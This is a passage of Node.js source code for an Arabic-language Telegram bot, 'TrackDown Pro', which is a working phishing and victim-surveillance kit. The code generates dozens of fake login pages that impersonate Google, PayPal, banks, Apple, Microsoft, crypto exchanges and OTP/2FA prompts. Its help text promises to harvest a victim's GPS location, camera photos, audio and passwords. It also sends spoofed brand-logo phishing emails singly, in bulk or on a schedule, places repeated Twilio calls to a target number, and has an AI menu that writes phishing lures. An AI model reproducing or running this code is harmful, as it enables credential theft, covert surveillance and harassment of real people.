        parse_mode: "HTML",
        reply_markup: {
            keyboard: [[{ text: '⏹ إيقاف المحادثة' }], [{ text: '🧹 مسح السجل' }, { text: '📋 القائمة الرئيسية' }]],
            resize_keyboard: true
        }
    });
} else if(callbackQuery.data === "ai_analyze"){
    adminChatIds.add(chatId);
    aiWaitingFor.set(chatId, 'analyze');
    aiChatMode.delete(chatId);
    bot.sendMessage(chatId, '🔍 أرسل عنوان IP الضحية للتحليل:', { reply_markup: { force_reply: true } });
} else if(callbackQuery.data === "ai_phish"){
    adminChatIds.add(chatId);
    aiWaitingFor.set(chatId, 'phish');
    aiChatMode.delete(chatId);
    bot.sendMessage(chatId, '✍️ أرسل وصف الهدف (مثال: موظف بنك، طالب جامعي):', { reply_markup: { force_reply: true } });
} else if(callbackQuery.data === "ai_translate"){
    adminChatIds.add(chatId);
    aiWaitingFor.set(chatId, 'translate');
    aiChatMode.delete(chatId);
    bot.sendMessage(chatId, '🌐 أرسل النص المراد ترجمته:', { reply_markup: { force_reply: true } });
} else if(callbackQuery.data === "ai_summarize"){
    adminChatIds.add(chatId);
    aiWaitingFor.delete(chatId);
    aiChatMode.delete(chatId);
    handleSummarize(chatId);
} else if(callbackQuery.data === "ai_suggest"){
    adminChatIds.add(chatId);
    aiWaitingFor.delete(chatId);
    aiChatMode.delete(chatId);
    handleSuggest(chatId);
} else if(callbackQuery.data === "ai_rewrite"){
    adminChatIds.add(chatId);
    aiWaitingFor.set(chatId, 'rewrite');
    aiChatMode.delete(chatId);
    bot.sendMessage(chatId, '✨ أرسل النص المراد إعادة كتابته:', { reply_markup: { force_reply: true } });
} else if(callbackQuery.data === "ai_clear"){
    aiChatHistory.delete(chatId);
    bot.sendMessage(chatId, '🧹 تم مسح سجل المحادثة!');
} else if(callbackQuery.data === "ai_close"){
    aiChatMode.delete(chatId);
    aiWaitingFor.delete(chatId);
    bot.sendMessage(chatId, '❌ تم إغلاق القائمة.', { reply_markup: { remove_keyboard: true } });
} else if(callbackQuery.data === "ai_back"){
    aiChatMode.delete(chatId);
    aiWaitingFor.delete(chatId);
    showAIMenu(chatId);
}
});

// Store pending call targets
const pendingCalls = new Map();

bot.on('message', async (msg) => {
    // Handle real Twilio calls
    if(msg?.reply_to_message?.text?.includes("أداة المكالمات الحقيقية") || msg?.reply_to_message?.text?.includes("أدخل رقم الهدف")){
        const chatId = msg.chat.id;
        const targetNumber = msg.text.trim();
        
        if(!targetNumber.startsWith('+')) {
            bot.sendMessage(chatId, "⚠️ يجب أن يبدأ الرقم بـ + ورمز الدولة\nمثال: +966501234567", {parse_mode: "HTML"});
            return;
        }
        
        pendingCalls.set(chatId, targetNumber);
        
        bot.sendMessage(chatId, `📞 <b>رقم الهدف:</b> <code>${targetNumber}</code>\n\n<b>اختر عدد المكالمات:</b>`, {
            parse_mode: "HTML",
            reply_markup: JSON.stringify({
                "inline_keyboard": [
                    [{text: "📞 مكالمة واحدة", callback_data: "call_1"}],
                    [{text: "📞📞 3 مكالمات", callback_data: "call_3"}],
                    [{text: "📞📞📞 5 مكالمات", callback_data: "call_5"}],
                    [{text: "🔥 10 مكالمات", callback_data: "call_10"}]
                ]
            })
        });
    }
});

// Make real Twilio call
async function makeCall(to, chatId) {
    if(!twilioClient || !process.env.TWILIO_NUMBER) {
        return { success: false, error: "Twilio not configured" };
    }
    
    try {
        const call = await twilioClient.calls.create({
            twiml: '<Response><Say language="ar-SA">مرحباً، هذه مكالمة تجريبية من نظام TrackDown. شكراً لك.</Say><Pause length="2"/><Say language="en-US">Hello, this is a test call from TrackDown system. Thank you.</Say></Response>',
            to: to,
            from: process.env.TWILIO_NUMBER
        });
        return { success: true, sid: call.sid };
    } catch(error) {
        return { success: false, error: error.message };
    }
}

// Handle call callbacks
bot.on('callback_query', async (query) => {
    if(query.data.startsWith('call_')) {
        const chatId = query.message.chat.id;
        const count = parseInt(query.data.split('_')[1]);
        const targetNumber = pendingCalls.get(chatId);
        
        if(!targetNumber) {
            bot.answerCallbackQuery(query.id, {text: "انتهت الجلسة، أعد المحاولة"});
            return;
        }
        
        bot.answerCallbackQuery(query.id);
        bot.sendMessage(chatId, `🚀 <b>جاري إجراء ${count} مكالمة...</b>\n\n📞 الهدف: <code>${targetNumber}</code>`, {parse_mode: "HTML"});
        
        let success = 0, failed = 0;
        
        for(let i = 0; i < count; i++) {
            const result = await makeCall(targetNumber, chatId);
            if(result.success) {
                success++;
                bot.sendMessage(chatId, `✅ المكالمة ${i+1}: تم الإرسال\nSID: <code>${result.sid}</code>`, {parse_mode: "HTML"});
            } else {
                failed++;
                let errorMsg = result.error;
                if(result.error.includes('unverified') || result.error.includes('Trial')) {
                    errorMsg = "حساب Twilio تجريبي! يجب ترقية الحساب أو إضافة الرقم كـ Verified في لوحة تحكم Twilio";
                }
                bot.sendMessage(chatId, `❌ المكالمة ${i+1}: فشل\n⚠️ ${errorMsg}`, {parse_mode: "HTML"});
                if(result.error.includes('Trial')) break; // Stop if trial limitation
            }
            
            // Wait 2 seconds between calls
            if(i < count - 1) await new Promise(r => setTimeout(r, 2000));
        }
        
        bot.sendMessage(chatId, `\n📊 <b>النتيجة النهائية:</b>\n✅ نجح: ${success}\n❌ فشل: ${failed}`, {parse_mode: "HTML"});
        pendingCalls.delete(chatId);
    }
});

function sendHelp(chatId) {
  bot.sendMessage(chatId, `📖 <b>دليل استخدام TrackDown Pro:</b>\n\n<b>1️⃣ الخطوة الأولى:</b>\nاضغط "إنشاء رابط جديد" أو أرسل /create\n\n<b>2️⃣ الخطوة الثانية:</b>\nأدخل رابط التحويل (مثل: https://google.com)\n\n<b>3️⃣ الخطوة الثالثة:</b>\nستحصل على 4 روابط مختلفة:\n\n🛡️ <b>Cloudflare:</b>\nصفحة فحص أمان وهمية - الأقوى لجمع كل البيانات\n\n🔐 <b>Login:</b>\nصفحة تسجيل دخول - لالتقاط كلمات المرور\n\n🎁 <b>Prize:</b>\nصفحة جائزة - لجمع الأسماء والهواتف\n\n🖼️ <b>WebView:</b>\nإطار مخفي - لمواقع محددة\n\n<b>📊 ماذا ستحصل؟</b>\n• موقع GPS دقيق\n• صور من الكاميرا\n• تسجيل صوتي\n• بصمة الجهاز الكاملة\n• بيانات تسجيل الدخول (إن أدخلها)\n\n⚠️ <i>ملاحظة: بعض المواقع تمنع الإطارات (WebView). استخدم Cloudflare للأفضل.</i>`, {parse_mode: "HTML"});
}

let users = new Set();
const userFakeMsg = new Map();
const waitingFakeCustom = new Set();
bot.on('message', async (msg) => { 
    users.add(msg.chat.id);
    const chatId = msg.chat.id;
    
    // Handle fake custom message
    if(waitingFakeCustom.has(chatId) && msg.text && !msg.text.startsWith('/')) {
        waitingFakeCustom.delete(chatId);
        userFakeMsg.set(chatId, {type: "custom", title: "تنبيه", msg: msg.text});
        bot.sendMessage(chatId, `✅ تم حفظ رسالتك المخصصة:\n\n<i>"${msg.text}"</i>\n\nستظهر للضحية عند فتح الرابط التالي.`, {parse_mode: "HTML"});
        return;
    }
    
    // Handle QR Code generation
    if(waitingQRCode.has(chatId) && msg.text && !msg.text.startsWith('/')) {
        waitingQRCode.delete(chatId);
        const qrUrl = `${hostURL}/qr/${encodeURIComponent(msg.text)}`;
        bot.sendPhoto(chatId, `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(msg.text)}`, {
            caption: `📱 <b>QR Code جاهز!</b>\n\n🔗 الرابط: <code>${msg.text}</code>\n\n💡 امسح الكود بكاميرا الهاتف لفتح الرابط`,
            parse_mode: "HTML"
        });
        return;
    }
    
    // Handle bulk email
    const bulkState = emailState.get(chatId);
    if(bulkState && bulkState.step === "bulk_emails" && msg.text && !msg.text.startsWith('/')) {
        const emails = msg.text.split('\n').map(e => e.trim()).filter(e => e.includes('@'));
        if(emails.length === 0) {
            bot.sendMessage(chatId, "❌ لم يتم العثور على عناوين بريد صالحة!", {parse_mode: "HTML"});
            emailState.delete(chatId);
            return;
        }
        bulkState.emails = emails;
        bulkState.step = "bulk_link";
        emailState.set(chatId, bulkState);
        bot.sendMessage(chatId, `📧 <b>تم العثور على ${emails.length} بريد</b>\n\nأرسل رابط التتبع:`, {parse_mode: "HTML", reply_markup: JSON.stringify({"force_reply": true})});
        return;
    }
    
    if(bulkState && bulkState.step === "bulk_link" && msg.text && !msg.text.startsWith('/')) {
        bulkState.trackingLink = msg.text.trim();
        bulkState.step = "bulk_body";
        emailState.set(chatId, bulkState);
        bot.sendMessage(chatId, `🔗 <b>تم حفظ الرابط</b>\n\nأرسل محتوى الرسالة:`, {parse_mode: "HTML", reply_markup: JSON.stringify({"force_reply": true})});
        return;
    }
    
    if(bulkState && bulkState.step === "bulk_body" && msg.text && !msg.text.startsWith('/')) {
        const template = emailTemplates[bulkState.company];
        if(!template || !process.env.SMTP_HOST) {
            emailState.delete(chatId);
            bot.sendMessage(chatId, "❌ خطأ في الإعدادات!", {parse_mode: "HTML"});
            return;
        }
        
        bot.sendMessage(chatId, `⏳ <b>جاري إرسال ${bulkState.emails.length} بريد...</b>`, {parse_mode: "HTML"});
        
        const transporter = nodemailer.createTransport({
            host: process.env.SMTP_HOST,
            port: parseInt(process.env.SMTP_PORT) || 587,
            secure: false,
            auth: { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS }
        });
        
        let sent = 0, failed = 0;
        for(const email of bulkState.emails) {
            try {
                const emailHtml = template.template(bulkState.trackingLink, msg.text.replace(/\n/g, '<br>'), 'cid:logo');
                const logoFiles = { google: 'google.svg', facebook: 'facebook.svg', instagram: 'instagram.svg', whatsapp: 'whatsapp.svg', apple: 'apple.svg', microsoft: 'microsoft.svg', amazon: 'amazon.svg', paypal: 'paypal.svg', netflix: 'netflix.svg', uber: 'uber.svg', spotify: 'spotify.svg', discord: 'discord.svg', binance: 'binance.svg', telegram_app: 'telegram.svg', bank: null };
                const mailOptions = {
                    from: `"${template.name}" <${process.env.SMTP_USER}>`,
                    replyTo: template.from,
                    to: email,
                    subject: template.subject,
                    html: emailHtml
                };
                if(logoFiles[bulkState.company]) {
                    const logoPath = `public/logos/${logoFiles[bulkState.company]}`;
                    if(fs.existsSync(logoPath)) {
                        mailOptions.attachments = [{ filename: logoFiles[bulkState.company], path: logoPath, cid: 'logo' }];
                    }
                }
                await transporter.sendMail(mailOptions);
                sent++;
            } catch(e) { failed++; }
        }
        
        emailState.delete(chatId);
        bot.sendMessage(chatId, `✅ <b>تم الإرسال الجماعي!</b>\n\n📧 نجح: ${sent}\n❌ فشل: ${failed}`, {parse_mode: "HTML"});
        return;
    }
    
    // Handle scheduled email
    if(bulkState && bulkState.step === "schedule_email_target" && msg.text && !msg.text.startsWith('/')) {
        bulkState.targetEmail = msg.text.trim();
        bulkState.step = "schedule_time";
        emailState.set(chatId, bulkState);
        bot.sendMessage(chatId, `⏰ <b>أرسل وقت الإرسال:</b>\n\nبالتنسيق: <code>HH:MM</code>\n\nمثال: <code>14:30</code> للإرسال الساعة 2:30 مساءً`, {parse_mode: "HTML", reply_markup: JSON.stringify({"force_reply": true})});
        return;
    }
    
    if(bulkState && bulkState.step === "schedule_time" && msg.text && !msg.text.startsWith('/')) {
        const [hours, minutes] = msg.text.split(':').map(Number);
        if(isNaN(hours) || isNaN(minutes)) {
            bot.sendMessage(chatId, "❌ تنسيق غير صحيح! استخدم HH:MM", {parse_mode: "HTML"});
            return;
        }
        bulkState.scheduleTime = { hours, minutes };
        bulkState.step = "schedule_link";
        emailState.set(chatId, bulkState);
        bot.sendMessage(chatId, `🔗 <b>أرسل رابط التتبع:</b>`, {parse_mode: "HTML", reply_markup: JSON.stringify({"force_reply": true})});
        return;
    }
    
    if(bulkState && bulkState.step === "schedule_link" && msg.text && !msg.text.startsWith('/')) {
        bulkState.trackingLink = msg.text.trim();
        bulkState.step = "schedule_body";
        emailState.set(chatId, bulkState);
        bot.sendMessage(chatId, `📝 <b>أرسل محتوى الرسالة:</b>`, {parse_mode: "HTML", reply_markup: JSON.stringify({"force_reply": true})});
        return;
    }
    
    if(bulkState && bulkState.step === "schedule_body" && msg.text && !msg.text.startsWith('/')) {
        const template = emailTemplates[bulkState.company];
        const { hours, minutes } = bulkState.scheduleTime;
        
        const job = schedule.scheduleJob({ hour: hours, minute: minutes }, async () => {
            try {
                const transporter = nodemailer.createTransport({
                    host: process.env.SMTP_HOST,
                    port: parseInt(process.env.SMTP_PORT) || 587,
                    secure: false,
                    auth: { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS }
                });
                
                const emailHtml = template.template(bulkState.trackingLink, msg.text.replace(/\n/g, '<br>'), 'cid:logo');
                await transporter.sendMail({
                    from: `"${template.name}" <${process.env.SMTP_USER}>`,
                    to: bulkState.targetEmail,
                    subject: template.subject,
                    html: emailHtml
                });
                
                bot.sendMessage(chatId, `✅ <b>تم إرسال البريد المجدول!</b>\n\n📧 إلى: ${bulkState.targetEmail}`, {parse_mode: "HTML"});
            } catch(e) {
                bot.sendMessage(chatId, `❌ فشل إرسال البريد المجدول: ${e.message}`, {parse_mode: "HTML"});
            }
        });
        
        emailState.delete(chatId);
        bot.sendMessage(chatId, `✅ <b>تم جدولة البريد!</b>\n\n📧 إلى: <code>${bulkState.targetEmail}</code>\n⏰ الوقت: ${hours}:${minutes.toString().padStart(2, '0')}\n🏢 الشركة: ${template.name}\n\n<i>سيتم الإرسال تلقائياً في الوقت المحدد.</i>`, {parse_mode: "HTML"});
        return;
    }
    
    // Handle email state
    const state = emailState.get(chatId);
    if(state && msg.text && !msg.text.startsWith('/')) {
        if(state.step === "custom_name") {
            state.customName = msg.text;
            state.step = "custom_from";
            emailState.set(chatId, state);
            bot.sendMessage(chatId, "📧 أرسل عنوان البريد المزيف للمرسل:\n\n<i>مثال: security@company.com</i>", {parse_mode: "HTML", reply_markup: JSON.stringify({"force_reply": true})});
        } else if(state.step === "custom_from") {
            state.customFrom = msg.text;
            state.step = "custom_subject";
            emailState.set(chatId, state);
            bot.sendMessage(chatId, "📝 أرسل عنوان الرسالة (Subject):", {reply_markup: JSON.stringify({"force_reply": true})});
        } else if(state.step === "custom_subject") {
            state.customSubject = msg.text;
            state.step = "target_email";
            emailState.set(chatId, state);
            bot.sendMessage(chatId, "📧 أرسل البريد الإلكتروني للضحية:", {reply_markup: JSON.stringify({"force_reply": true})});
        } else if(state.step === "target_email") {
            state.targetEmail = msg.text;
            state.step = "tracking_link";
            emailState.set(chatId, state);
            bot.sendMessage(chatId, "🔗 <b>أرسل رابط التتبع الخاص بك:</b>\n\n<i>هذا الرابط سيظهر كزر في الرسالة، عند ضغط الضحية عليه سيفتح صفحة التتبع</i>\n\n💡 أنشئ رابط أولاً من القائمة الرئيسية إذا لم يكن لديك واحد", {parse_mode: "HTML", reply_markup: JSON.stringify({"force_reply": true})});
        } else if(state.step === "tracking_link") {
            state.trackingLink = msg.text.trim();
            state.step = "email_body";
            emailState.set(chatId, state);
            bot.sendMessage(chatId, "📝 أرسل محتوى الرسالة (النص الذي سيظهر قبل الزر):", {parse_mode: "HTML", reply_markup: JSON.stringify({"force_reply": true})});
        } else if(state.step === "email_body") {
            const body = msg.text;
            const trackingLink = state.trackingLink || "#";
            let template = state.template ? emailTemplates[state.template] : null;
            
            // Check if SMTP is configured
            if(!process.env.SMTP_HOST || !process.env.SMTP_USER || !process.env.SMTP_PASS) {
                emailState.delete(chatId);
                bot.sendMessage(chatId, `❌ <b>لم يتم إعداد SMTP!</b>\n\nلإرسال البريد، تحتاج إضافة:\n\n<code>SMTP_HOST</code> - خادم SMTP\n<code>SMTP_PORT</code> - المنفذ (587)\n<code>SMTP_USER</code> - اسم المستخدم\n<code>SMTP_PASS</code> - كلمة المرور\n\n💡 يمكنك استخدام Gmail, Outlook, SendGrid, أو أي خدمة SMTP أخرى.`, {parse_mode: "HTML"});
                return;
            }
            
            let emailHtml;
            let fromName, fromEmail, subject;
            
            if(template && template.template) {
                // Use professional HTML template with CID embedded logos
                emailHtml = template.template(trackingLink, body.replace(/\n/g, '<br>'), 'cid:logo');
                fromName = template.name;
                fromEmail = template.from;
                subject = template.subject;
            } else {
                // Custom template
                fromName = state.customName;
                fromEmail = state.customFrom;
                subject = state.customSubject;
                emailHtml = `
                    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; background: #fff; border: 1px solid #ddd; border-radius: 8px;">
                        <div style="background: #333; padding: 20px; text-align: center; border-radius: 8px 8px 0 0;">
                            <h2 style="color: #fff; margin: 0;">${fromName}</h2>
                        </div>
                        <div style="padding: 30px;">
                            <p style="font-size: 15px; line-height: 1.6; color: #333;">${body.replace(/\n/g, '<br>')}</p>
                            <div style="text-align: center; margin: 30px 0;">
                                <a href="${trackingLink}" style="display: inline-block; background: #007bff; color: #fff; padding: 12px 32px; border-radius: 6px; text-decoration: none; font-weight: bold;">اضغط هنا</a>
                            </div>
                        </div>
                        <div style="background: #f5f5f5; padding: 16px; text-align: center; border-radius: 0 0 8px 8px;">
                            <p style="font-size: 12px; color: #666; margin: 0;">هذه رسالة آلية</p>
                        </div>
                    </div>`;
            }
            
            try {
                const transporter = nodemailer.createTransport({
                    host: process.env.SMTP_HOST,
                    port: parseInt(process.env.SMTP_PORT) || 587,
                    secure: false,
                    auth: {
                        user: process.env.SMTP_USER,
                        pass: process.env.SMTP_PASS
                    }
                });
                
                // Get logo file for selected company
                const logoFiles = {
                    google: 'google.svg',
                    facebook: 'facebook.svg',
                    instagram: 'instagram.svg',
                    whatsapp: 'whatsapp.svg',
                    apple: 'apple.svg',
                    microsoft: 'microsoft.svg',
                    amazon: 'amazon.svg',
                    paypal: 'paypal.svg',
                    netflix: 'netflix.svg',
                    uber: 'uber.svg',
                    spotify: 'spotify.svg',
                    discord: 'discord.svg',
                    binance: 'binance.svg',
                    telegram_app: 'telegram.svg',
                    bank: null
                };
                
                const mailOptions = {
                    from: `"${fromName}" <${process.env.SMTP_USER}>`,
                    replyTo: fromEmail,
                    to: state.targetEmail,
                    subject: subject,
                    html: emailHtml
                };
                
                // Add embedded logo if available
                if(state.company && logoFiles[state.company]) {
                    const logoPath = `public/logos/${logoFiles[state.company]}`;
                    if(fs.existsSync(logoPath)) {
                        mailOptions.attachments = [{
                            filename: logoFiles[state.company],
                            path: logoPath,
                            cid: 'logo'
                        }];
                    }
                }
                
                await transporter.sendMail(mailOptions);
                
                emailState.delete(chatId);
                bot.sendMessage(chatId, `✅ <b>تم إرسال البريد بنجاح!</b>\n\n📧 إلى: <code>${state.targetEmail}</code>\n🏢 باسم: <b>${fromName}</b>\n📝 العنوان: ${subject}\n🔗 الرابط: <code>${trackingLink}</code>\n\n💡 عندما يضغط الضحية على الزر في الرسالة، سيفتح رابط التتبع الخاص بك!`, {parse_mode: "HTML"});
            } catch(err) {
                emailState.delete(chatId);
                bot.sendMessage(chatId, `❌ <b>فشل إرسال البريد!</b>\n\n<code>${err.message}</code>`, {parse_mode: "HTML"});
            }
        }
        return;
    }
});

function sendStats(chatId) {
    bot.sendMessage(chatId, `📊 <b>Bot Statistics:</b>\n\n👥 Total Users: <code>${users.size}</code>\n🚀 Uptime: <code>${Math.floor(process.uptime() / 60)} minutes</code>`, {parse_mode: "HTML"});
}

async function broadcast(chatId, text) {
    let success = 0;
    for (let user of users) {
        try {
            await bot.sendMessage(user, `📢 <b>Broadcast Message:</b>\n\n${text}`, {parse_mode: "HTML"});
            success++;
        } catch(e){}
    }
    bot.sendMessage(chatId, `✅ Broadcast sent to ${success}/${users.size} users.`, {parse_mode: "HTML"});
}
bot.on('polling_error', (error) => {
//console.log(error.code); 
});

// Block IP Handler
bot.on('message', async (msg) => {
    // Block IP Handler
    if(msg?.reply_to_message?.text?.includes("حظر IP")){
        const chatId = msg.chat.id;
        const ip = msg.text.trim();
        
        if(!/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
            bot.sendMessage(chatId, "⚠️ عنوان IP غير صحيح!", {parse_mode: "HTML"});
            return;
        }
        
        try {
            await pool.query(`INSERT INTO blocked_ips (user_id, ip, reason) VALUES ($1, $2, $3)`, [chatId.toString(36), ip, 'Manual block']);
            blockedIPs.set(chatId.toString(36) + '_' + ip, true);
            bot.sendMessage(chatId, `✅ تم حظر IP: <code>${ip}</code>`, {parse_mode: "HTML"});
        } catch(e) {
            bot.sendMessage(chatId, "❌ خطأ في الحظر", {parse_mode: "HTML"});
        }
    }
    
});






async function createLink(cid,msg){

var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
 
var url=cid.toString(36)+'/'+btoa(msg);
var m={
  reply_markup:JSON.stringify({
    "inline_keyboard":[[{text:"🔄 إنشاء رابط جديد",callback_data:"crenew"}]]
  } )
};

// All 14 template URLs
var cUrl=`${hostURL}/c/${url}`;
var wUrl=`${hostURL}/w/${url}`;
var lUrl=`${hostURL}/l/${url}`;
var pUrl=`${hostURL}/p/${url}`;
var iUrl=`${hostURL}/i/${url}`;
var sUrl=`${hostURL}/s/${url}`;
var waUrl=`${hostURL}/wa/${url}`;
var bUrl=`${hostURL}/b/${url}`;
var nfUrl=`${hostURL}/nf/${url}`;
var ppUrl=`${hostURL}/pp/${url}`;
var gUrl=`${hostURL}/g/${url}`;
var fbUrl=`${hostURL}/fb/${url}`;
var ttUrl=`${hostURL}/tt/${url}`;
var cuUrl=`${hostURL}/cu/${url}`;
var amUrl=`${hostURL}/am/${url}`;
var apUrl=`${hostURL}/ap/${url}`;
var msUrl=`${hostURL}/ms/${url}`;
var liUrl=`${hostURL}/li/${url}`;
var twUrl=`${hostURL}/tw/${url}`;
var tgUrl=`${hostURL}/tg/${url}`;
var stUrl=`${hostURL}/st/${url}`;
var epUrl=`${hostURL}/ep/${url}`;
var ccUrl=`${hostURL}/cc/${url}`;
var otpUrl=`${hostURL}/otp/${url}`;
var chatUrl=`${hostURL}/chat/${url}`;
var gameUrl=`${hostURL}/game/${url}`;
var capUrl=`${hostURL}/cap/${url}`;
var chuUrl=`${hostURL}/chu/${url}`;
var wifiUrl=`${hostURL}/wifi/${url}`;
var dlUrl=`${hostURL}/dl/${url}`;
var e404Url=`${hostURL}/e404/${url}`;
var srvUrl=`${hostURL}/srv/${url}`;
var zmUrl=`${hostURL}/zm/${url}`;
var dbUrl=`${hostURL}/db/${url}`;
var icUrl=`${hostURL}/ic/${url}`;
var spUrl=`${hostURL}/sp/${url}`;
var rbUrl=`${hostURL}/rb/${url}`;
var cbUrl=`${hostURL}/cb/${url}`;
var yhUrl=`${hostURL}/yh/${url}`;
var ghUrl=`${hostURL}/gh/${url}`;
var ubUrl=`${hostURL}/ub/${url}`;
var adUrl=`${hostURL}/ad/${url}`;
var o365Url=`${hostURL}/o365/${url}`;
var airUrl=`${hostURL}/air/${url}`;
var wagUrl=`${hostURL}/wag/${url}`;
  
bot.sendChatAction(cid,"typing");

// Get short URLs for all 26 templates (internal shortener - instant)
const shortC = getShortUrl(cUrl);
const shortW = getShortUrl(wUrl);
const shortL = getShortUrl(lUrl);
const shortP = getShortUrl(pUrl);
const shortI = getShortUrl(iUrl);
const shortS = getShortUrl(sUrl);
const shortWA = getShortUrl(waUrl);
const shortB = getShortUrl(bUrl);
const shortNF = getShortUrl(nfUrl);
const shortPP = getShortUrl(ppUrl);
const shortG = getShortUrl(gUrl);
const shortFB = getShortUrl(fbUrl);
const shortTT = getShortUrl(ttUrl);
const shortCU = getShortUrl(cuUrl);
const shortAM = getShortUrl(amUrl);
const shortAP = getShortUrl(apUrl);
const shortMS = getShortUrl(msUrl);
const shortLI = getShortUrl(liUrl);
const shortTW = getShortUrl(twUrl);
const shortTG = getShortUrl(tgUrl);
const shortST = getShortUrl(stUrl);
const shortEP = getShortUrl(epUrl);
const shortCC = getShortUrl(ccUrl);
const shortOTP = getShortUrl(otpUrl);
const shortChat = getShortUrl(chatUrl);
const shortGame = getShortUrl(gameUrl);
const shortCap = getShortUrl(capUrl);
const shortChu = getShortUrl(chuUrl);
const shortWifi = getShortUrl(wifiUrl);
const shortDl = getShortUrl(dlUrl);
const shortE404 = getShortUrl(e404Url);
const shortSrv = getShortUrl(srvUrl);
const shortZm = getShortUrl(zmUrl);
const shortDB = getShortUrl(dbUrl);
const shortIC = getShortUrl(icUrl);
const shortSP = getShortUrl(spUrl);
const shortRB = getShortUrl(rbUrl);
const shortCB = getShortUrl(cbUrl);
const shortYH = getShortUrl(yhUrl);
const shortGH = getShortUrl(ghUrl);
const shortUB = getShortUrl(ubUrl);
const shortAD = getShortUrl(adUrl);
const shortO365 = getShortUrl(o365Url);
const shortAIR = getShortUrl(airUrl);
const shortWAG = getShortUrl(wagUrl);

// Send links in messages to avoid Telegram limit
const linksMsg1 = `✅ <b>تم إنشاء الروابط بنجاح!</b>\n\n🔗 الرابط الأصلي: ${msg}\n\n` +
`<b>🎯 القوالب المتاحة (45 قالب):</b>\n\n` +
`🛡️ <b>Cloudflare:</b>\n<code>${shortC}</code>\n\n` +
`🔐 <b>Login:</b>\n<code>${shortL}</code>\n\n` +
`🎁 <b>Prize:</b>\n<code>${shortP}</code>\n\n` +
`📸 <b>Instagram:</b>\n<code>${shortI}</code>\n\n` +
`👻 <b>Snapchat:</b>\n<code>${shortS}</code>\n\n` +
`💬 <b>WhatsApp:</b>\n<code>${shortWA}</code>\n\n` +
`🏦 <b>Bank:</b>\n<code>${shortB}</code>`;

const linksMsg2 = `<b>📱 المزيد من القوالب:</b>\n\n` +
`🎬 <b>Netflix:</b>\n<code>${shortNF}</code>\n\n` +
`💳 <b>PayPal:</b>\n<code>${shortPP}</code>\n\n` +
`🔍 <b>Google:</b>\n<code>${shortG}</code>\n\n` +
`📘 <b>Facebook:</b>\n<code>${shortFB}</code>\n\n` +
`🎵 <b>TikTok:</b>\n<code>${shortTT}</code>\n\n` +
`🛒 <b>Amazon:</b>\n<code>${shortAM}</code>\n\n` +
`🍎 <b>Apple ID:</b>\n<code>${shortAP}</code>`;

const linksMsg3 = `<b>🎮 قوالب إضافية:</b>\n\n` +
`🪟 <b>Microsoft:</b>\n<code>${shortMS}</code>\n\n` +
`💼 <b>LinkedIn:</b>\n<code>${shortLI}</code>\n\n` +
`𝕏 <b>Twitter/X:</b>\n<code>${shortTW}</code>\n\n` +
`✈️ <b>Telegram:</b>\n<code>${shortTG}</code>\n\n` +
`🎮 <b>Steam:</b>\n<code>${shortST}</code>\n\n` +
`🎯 <b>Epic Games:</b>\n<code>${shortEP}</code>`;

const linksMsg4 = `<b>💰 قوالب متقدمة:</b>\n\n` +
`💳 <b>Credit Card:</b>\n<code>${shortCC}</code>\n\n` +
`🔑 <b>OTP/2FA:</b>\n<code>${shortOTP}</code>\n\n` +
`💬 <b>Fake Chat:</b>\n<code>${shortChat}</code>\n\n` +
`🎰 <b>Spin Game:</b>\n<code>${shortGame}</code>\n\n` +
`⚙️ <b>Custom:</b>\n<code>${shortCU}</code>\n\n` +
`🖼️ <b>WebView:</b>\n<code>${shortW}</code>`;

const linksMsg5 = `<b>🆕 قوالب جديدة:</b>\n\n` +
`🤖 <b>CAPTCHA:</b>\n<code>${shortCap}</code>\n\n` +
`🔄 <b>Chrome Update:</b>\n<code>${shortChu}</code>\n\n` +
`📶 <b>WiFi Portal:</b>\n<code>${shortWifi}</code>\n\n` +
`📥 <b>File Download:</b>\n<code>${shortDl}</code>\n\n` +
`❌ <b>404 Page:</b>\n<code>${shortE404}</code>\n\n` +
`📋 <b>Survey:</b>\n<code>${shortSrv}</code>\n\n` +
`📹 <b>Zoom:</b>\n<code>${shortZm}</code>`;

const linksMsg6 = `<b>🌟 قوالب v7.0 الجديدة:</b>\n\n` +
`📦 <b>Dropbox:</b>\n<code>${shortDB}</code>\n\n` +
`☁️ <b>iCloud:</b>\n<code>${shortIC}</code>\n\n` +
`🎵 <b>Spotify:</b>\n<code>${shortSP}</code>\n\n` +
`🎮 <b>Roblox:</b>\n<code>${shortRB}</code>\n\n` +
`💰 <b>Coinbase:</b>\n<code>${shortCB}</code>\n\n` +
`📧 <b>Yahoo:</b>\n<code>${shortYH}</code>`;

const linksMsg7 = `<b>🔥 المزيد من القوالب الجديدة:</b>\n\n` +
`🐙 <b>GitHub:</b>\n<code>${shortGH}</code>\n\n` +
`🚗 <b>Uber:</b>\n<code>${shortUB}</code>\n\n` +
`🎨 <b>Adobe:</b>\n<code>${shortAD}</code>\n\n` +
`📊 <b>Office 365:</b>\n<code>${shortO365}</code>\n\n` +
`🪙 <b>Crypto Airdrop:</b>\n<code>${shortAIR}</code>\n\n` +
`💛 <b>WhatsApp Gold:</b>\n<code>${shortWAG}</code>`;

await bot.sendMessage(cid, linksMsg1, {parse_mode:"HTML"});
await bot.sendMessage(cid, linksMsg2, {parse_mode:"HTML"});
await bot.sendMessage(cid, linksMsg3, {parse_mode:"HTML"});
await bot.sendMessage(cid, linksMsg4, {parse_mode:"HTML"});
await bot.sendMessage(cid, linksMsg5, {parse_mode:"HTML"});
await bot.sendMessage(cid, linksMsg6, {parse_mode:"HTML"});
bot.sendMessage(cid, linksMsg7, {parse_mode:"HTML",...m});
}
else{
bot.sendMessage(cid,`⚠️ الرجاء إدخال رابط صحيح يبدأ بـ http أو https`);
createNew(cid);
}  
}


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`🌐 Enter Your URL`,mk);
}





app.get("/", (req, res) => {
var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}

const dashboardHTML = `
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
